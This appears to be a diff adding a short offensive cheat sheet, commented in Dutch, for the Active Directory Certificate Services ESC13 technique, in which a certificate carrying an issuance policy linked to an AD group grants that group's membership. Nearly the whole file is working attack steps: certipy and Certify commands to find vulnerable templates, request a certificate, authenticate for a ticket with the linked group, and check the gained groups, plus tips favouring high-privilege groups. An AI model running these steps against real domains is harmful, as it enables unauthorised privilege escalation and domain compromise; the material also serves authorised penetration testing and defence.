@@ -1,0 +1,21 @@
+# AD CS ESC13 - OID Group Link (Issuance Policy linked to AD Group)
+# Een issuance policy OID is gekoppeld aan een AD groep via msDS-OIDToGroupLink
+# Certificaat met deze policy → gebruiker wordt lid van de gelinkte groep
+# Stap 1: Enumerate issuance policies met groep links
+certipy find -u user@domain.local -p Password123! -dc-ip DC_IP -vulnerable
+# Zoek naar OID objecten met msDS-OIDToGroupLink attribuut
+# Handmatig via LDAP:
+Get-ADObject -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Filter {msDS-OIDToGroupLink -like "*"} -Properties *
+# Stap 2: Vind welke template deze issuance policy vereist
+# Template met msPKI-Certificate-Policy die verwijst naar het OID
+.\Certify.exe find
+# Stap 3: Request certificaat met de template
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template TemplateName
+# Stap 4: Authenticeer — het certificaat bevat de issuance policy
+# De DC voegt de gelinkte groep toe aan het PAC van het TGT
+certipy auth -pfx user.pfx -dc-ip DC_IP
+# Stap 5: Verifieer groepslidmaatschap
+whoami /groups
+# Tip: ESC13 geeft effectief groepslidmaatschap via certificaat enrollment
+# Tip: Vooral gevaarlijk als de gelinkte groep hoge privileges heeft
+# Tip: Check alle OID objecten in CN=OID,CN=Public Key Services
